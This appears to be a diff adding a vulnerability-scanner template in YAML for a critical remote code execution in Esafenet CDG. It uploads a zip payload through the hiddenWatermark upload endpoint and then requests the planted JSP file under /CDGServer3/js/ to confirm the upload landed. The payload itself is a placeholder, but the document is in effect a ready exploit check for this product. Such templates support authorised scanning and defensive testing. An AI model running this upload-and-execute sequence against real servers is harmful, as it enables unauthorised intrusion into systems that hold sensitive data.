@@ -1,0 +1,32 @@
+id: yaml-poc-esafenet-cdg-rce-CT-1056284
+info:
+  name: Yaml Poc Esafenet Cdg Rce Ct 1056284
+  author: kun.fang
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-esafenet-cdg-rce-CT-1056284'
+  tags: rce
+  reference: []
+http:
+- method: POST
+  path:
+  - /CDGServer3/hiddenWatermark/uploadFile
+  body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data;\
+    \ name=\"doc\"; filename=\"{{randomFileName}}.zip\"\r\nContent-Type: application/zip\r\
+    \n\r\n{{payload}}\r\n------WebKitFormBoundary{{rboundary}}--\r\n"
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+- method: GET
+  path:
+  - /CDGServer3/js/{{randomFileName}}.jsp
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
